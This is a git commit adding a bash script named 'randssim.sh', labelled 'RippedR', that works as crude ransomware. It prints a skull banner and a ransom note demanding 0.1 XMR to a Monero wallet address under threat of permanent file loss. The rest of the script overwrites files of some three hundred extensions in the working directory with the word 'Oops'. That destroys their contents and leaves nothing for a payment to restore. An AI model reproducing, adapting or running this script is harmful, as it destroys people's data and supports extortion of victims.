74f4d242e51777b9b66192bcaf877ede7255f66a
chilloxop <71260756+chilloxop@users.noreply.github.com>
2021-07-06 21:18:02 +0930

    dont run
    dadadada

---
+++ randssim.sh
@@ -0,0 +1,369 @@
+##########################
+#  RippedR By JonesBBQ   #
+#  or all linux distros  #
+##########################
+
+## File formats supported ##
+printf '\033[41m' # for cool color
+RED='\033[0;31m'
+NC='\033[0m'
+ADDR='46z5cQxqzRZ1HBRWRexRh4PhAKUpreKigFHhVGAsJ5aob4y2j8467Af4CuyfDC7pC6afEsLrCEKQFRptxi3z6dBk1vyLt42'
+echo -e "
+
+
+             uu$:$:$:$:$:$uu
+          uu$$$$$$$$$$$$$$$$$uu
+         u$$$$$$$$$$$$$$$$$$$$$u
+         u$$$$$$$$$$$$$$$$$$$$$$$u
+       u$$$$$$$$$$$$$$$$$$$$$$$$$u
+       u$$$$$$$$$$$$$$$$$$$$$$$$$u
+       u$$$$$$*   *$$$*   *$$$$$$u
+       *$$$$*      u$u       $$$$*
+        $$$u       u$u       u$$$
+        $$$u      u$$$u      u$$$
+         *$$$$uu$$$   $$$uu$$$$*
+          *$$$$$$$*   *$$$$$$$*
+            u$$$$$$$u$$$$$$$u
+             u$*$*$*$*$*$*$u
+  uuu        $$u$ $ $ $ $u$$       uuu
+ u$$$$        $$u$u$u$u$u$$       u$$$$
+  $$$$$uu      *$$$$$$$$$*     uu$$$$$$
+u$$$$$$$$$$$      *****    uuuu$$$$$$$$$
+$$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*
+ ***      **$$$$$$$$$$$uu **$***
+          uuuu **$$$$$$$$$$uuu
+ u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$
+ $$$$$$$$$$****           **$$$$$$$$$$$*
+   *$$$$$*                      **$$$$**
+     $$$*                         $$$$*
+
+
+
+"
+echo "${RED} Oops it seems all your precious files are now in imense threat!    "
+echo -e "It seems the only way to save them is with paying 0.1 XMR (Monero), 20 USD at the time, to this address : "
+echo -e "${NC} 46z5cQxqzRZ1HBRWRexRh4PhAKUpreKigFHhVGAsJ5aob4y2j8467Af4CuyfDC7pC6afEsLrCEKQFRptxi3z6dBk1vyLt42 "
+echo "If you dont know how to buy, or dont have XMR Monero, open this link to buy it : "
+echo -e "https://www.binance.com/"
+echo "${RED} If this isnt paid by 5 days, your files with be permenantly R!PPED "
+
+
+
+
+echo “printf Wow, if this is appearing it worked!” > *.sh
+echo "Oops" > *.txt
+echo "Oops" > *.png
+echo "Oops" > *.jpg
+echo "Oops" > *.gif
+echo "Oops" > *.pdf
+echo "Oops" > *.bin
+echo "Oops" > *.py
+echo "Oops" > *.c
+echo "Oops" > *.cpp
+echo "Oops" > *.exe
+echo "Oops" > *.docx
+echo "Oops" > *.lua
+echo "Oops" > *.dif
+echo "Oops" > *.doc
+echo "Oops" > *.rar
+echo "Oops" > *.zip
+echo "Oops" > *.apk
+echo "Oops" > *.bmp
+echo "Oops" > *.bz2
+echo "Oops" > *.blend
+echo "Oops" > *.db
+echo "Oops" > *.dart
+echo "Oops" > *.dbf
+echo "Oops" > *.deb
+echo "Oops" > *.dir
+echo "Oops" > *.dll
+echo "Oops" > *.html
+echo "Oops" > *.css
+echo "Oops" > *.js
+echo "Oops" > *.dat
+echo "Oops" > *.d
+echo "Oops" > *.asx
+echo "Oops" > *.asm
+echo "Oops" > *.amg
+echo "Oops" > *.art
+echo "Oops" > *.adx
+echo "Hey!" > *.adam
+echo "Oops" > *.b
+echo "Oops" > *.bar
+echo "Oops" > *.beam
+echo "Oops" > *.bas
+echo "Oops" > *.bat
+echo "Oops" > *.class
+echo "Oops" > *.java
+echo "Oops" > *.cc
+echo "Oops" > *.cmod
+echo "Oops" > *.compile
+echo "Oops" > *.cr2
+echo "Oops" > *.crdownload
+echo "Oops" > *.csv
+echo "Oops" > *.cdf
+echo "Oops" > *.cpl
+echo "Oops" > *.crt
+echo "Oops" > *.csproj
+echo "Oops" > *.htm
+echo "Oops" > *.ppt
+echo "Oops" > *.pptx
+echo "Oops" > *.ods
+echo "Oops" > *.xls
+echo "Oops" > *.xlsx
+echo "Oops" > *.log
+echo "Oops" > *.msg
+echo "Oops" > *.rtf
+echo "Oops" > *.wpd
+echo "Oops" > *.wps
+echo "Oops" > *.odt
+echo "Oops" > *.pages
+echo "Oops" > *.tex
+echo "Oops" > *.dat
+echo "Oops" > *.ged
+echo "Oops" > *.key
+echo "Oops" > *.keychain
+echo "Oops" > *.sdf
+echo "Oops" > *.tar
+echo "Oops" > *.vcf
+echo "Oops" > *.xml
+echo "Oops" > *.aif
+echo "Oops" > *.iff
+echo "Oops" > *.m3u
+echo "Oops" > *.m4a
+echo "Oops" > *.mid
+echo "Oops" > *.mp3
+echo "Oops" > *.mpa
+echo "Oops" > *.wav
+echo "Oops" > *.wma
+echo "Oops" > *.3g2
+echo "Oops" > *.3gp
+echo "Oops" > *.asf
+echo "Oops" > *.avi
+echo "Oops" > *.flv
+echo "Oops" > *.m4v
+echo "Oops" > *.mov
+echo "Oops" > *.mpg
+echo "Oops" > *.mp4
+echo "Oops" > *.srt
+echo "Oops" > *.swf
+echo "Oops" > *.vob
+echo "Oops" > *.wmv
+echo "Oops" > *.3dm
+echo "Oops" > *.3ds
+echo "Oops" > *.max
+echo "Oops" > *.obj
+echo "Oops" > *.dds
+echo "Oops" > *.heic
+echo "Oops" > *.psd
+echo "Oops" > *.pspimage
+echo "Oops" > *.tga
+echo "Oops" > *.thm
+echo "Oops" > *.tif
+echo "Oops" > *.yuv
+echo "Oops" > *.ai
+echo "Oops" > *.eps
+echo "Oops" > *.svg
+echo "Oops" > *.indd
+echo "Oops" > *.pct
+echo "Oops" > *.xlr
+echo "Oops" > *.accdb
+echo "Oops" > *.mdb
+echo "Oops" > *.pdb
+echo "Oops" > *.sql
+echo "Oops" > *.app
+echo "Oops" > *.cgi
+echo "Oops" > *.com
+echo "Oops" > *.gadget
+echo "Oops" > *.jar
+echo "Oops" > *.wsf
+echo "Oops" > *.dem
+echo "Oops" > *.wad
+echo "Oops" > *.gam
+echo "Oops" > *.nes
+echo "Oops" > *.rom
+echo "Oops" > *.sav
+echo "Oops" > *.dwg
+echo "Oops" > *.dxf
+echo "Oops" > *.gpx
+echo "Oops" > *.kml
+echo "Oops" > *.kmz
+echo "Oops" > *.asp
+echo "Oops" > *.aspx
+echo "Oops" > *.cer
+echo "Oops" > *.cfm
+echo "Oops" > *.dcr
+echo "Oops" > *.jsp
+echo "Oops" > *.php
+echo "Oops" > *.pl
+echo "Oops" > *.rss
+echo "Oops" > *.xhtml
+echo "Oops" > *.crx
+echo "Oops" > *.plugin
+echo "Oops" > *.fnt
+echo "Oops" > *.fon
+echo "Oops" > *.otf
+echo "Oops" > *.trf
+echo "Oops" > *.cab
+echo "Oops" > *.cpl
+echo "Oops" > *.cur
+echo "Oops" > *.deskthemepack
+echo "Oops" > *.dmp
+echo "Oops" > *.drv
+echo "Oops" > *.icns
+echo "Oops" > *.ico
+echo "Oops" > *.lnk
+echo "Oops" > *.sys
+echo "Oops" > *.cfg
+echo "Oops" > *.ini
+echo "Oops" > *.prf
+echo "Oops" > *.hqx
+echo "Oops" > *.mim
+echo "Oops" > *.uue
+echo "Oops" > *.7z
+echo "Oops" > *.cbr
+echo "Oops" > *.gz
+echo "Oops" > *.pkg
+echo "Oops" > *.rpm
+echo "Oops" > *.sitx
+echo "Oops" > *.tar.gz
+echo "Oops" > *.zipx
+echo "Oops" > *.bin
+echo "Oops" > *.cue
+echo "Oops" > *.iso
+echo "Oops" > *.mdf
+echo "Oops" > *.toast
+echo "Oops" > *.vcd
+echo "Oops" > *.dtd
+echo "Oops" > *.fla
+echo "Oops" > *.h
+echo "Oops" > *.m
+echo "Oops" > *.sln
+echo "Oops" > *.swift
+echo "Oops" > *.vb
+echo "Oops" > *.vcxproj
+echo "Oops" > *.xcodeproj
+echo "Oops" > *.bak
+echo "Oops" > *.tmp
+echo "Oops" > *.torrent
+echo "Oops" > *.part
+echo "Oops" > *.msi
+echo "Oops" > *.ics
+echo "Oops" > *.lgo
+echo "Oops" > *.appxbundle
+echo "Oops" > *.ypr
+echo "Oops" > *.sb
+echo "Oops" > *.sb2
+echo "Oops" > *.appx
+echo "Oops" > *.ipr
+echo "Oops" > *.ino
+echo "Oops" > *.arsc
+echo "Oops" > *.pjk
+echo "Oops" > *.pyd
+echo "Oops" > *.rbxm
+echo "Oops" > *.in
+echo "Oops" > *.smali
+echo "Oops" > *.octest
+echo "Oops" > *.sc
+echo "Oops" > *.awk
+echo "Oops" > *.vbp
+echo "Oops" > *.md
+echo "Oops" > *.patch
+echo "Oops" > *.git
+echo "Oops" > *.dex
+echo "Oops" > *.mfa
+echo "Oops" > *.po
+echo "Oops" > *.swc
+echo "Oops" > *.pas
+echo "Oops" > *.mf
+echo "Oops" > *.ocx
+echo "Oops" > *.gmk
+echo "Oops" > *.res
+echo "Oops" > *.resources
+echo "Oops" > *.yml
+echo "Oops" > *.config
+echo "Oops" > *.gs
+echo "Oops" > *.capx
+echo "Oops" > *.ml
+echo "Oops" > *.pbg
+echo "Oops" > *.ise
+echo "Oops" > *.markdown
+echo "Oops" > *.resx
+echo "Oops" > *.fs
+echo "Oops" > *.xsd
+echo "Oops" > *.hpp
+echo "Oops" > *.qpr
+echo "Oops" > *.hs
+echo "Oops" > *.cod
+echo "Oops" > *.suo
+echo "Oops" > *.bbc
+echo "Oops" > *.fbp
+echo "Oops" > *.rb
+echo "Oops" > *.so
+echo "Oops" > *.gm81
+echo "Oops" > *.swd
+echo "Oops" > *.nib
+echo "Oops" > *.bluej
+echo "Oops" > *.targets
+echo "Oops" > *.y
+echo "Oops" > *.o
+echo "Oops" > *.f
+echo "Oops" > *.s19
+echo "Oops" > *.ssi
+echo "Oops" > *.ph
+echo "Oops" > *.pwn
+echo "Oops" > *.ane
+echo "Oops" > *.ctp
+echo "Oops" > *.pyw
+echo "Oops" > *.mm
+echo "Oops" > *.erb
+echo "Oops" > *.bet
+echo "Oops" > *.ex
+echo "Oops" > *.idb
+echo "Oops" > *.rc
+echo "Oops" > *.abc
+echo "Oops" > *.w32
+echo "Oops" > *.iml
+echo "Oops" > *.ptl
+echo "Oops" > *.workspace
+echo "Oops" > *.pro
+echo "Oops" > *.nvv
+echo "Oops" > *.ccs
+echo "Oops" > *.wdw
+echo "Oops" > *.sas
+echo "Oops" > *.mak
+echo "Oops" > *.scr
+echo "Oops" > *.src
+echo "Oops" > *.owl
+echo "Oops" > *.xql
+echo "Oops" > *.mdzip
+echo "Oops" > *.lucidsnippet
+echo "Oops" > *.rpm
+echo "Oops" > *.src.rpm
+echo "Oops" > *.mom
+echo "Oops" > *.gszip
+echo "Oops" > *.xpm
+echo "Oops" > *.spr
+echo "Oops" > *.hdr
+echo "Oops" > *.jpeg
+echo "Oops" > *.dds
+echo "Oops" > *.webp
+echo "Oops" > *.bif
+echo "Oops" > *.px
+echo "Oops" > *.rix
+echo "Oops" > *.awd
+echo "Oops" > *.cut
+echo "Oops" > *.gim
+echo "Oops" > *.bmc
+
+
+
+
+
+
+#######################
+#                     #
+# End of file         #
+#		      #
+#                     #
+#######################
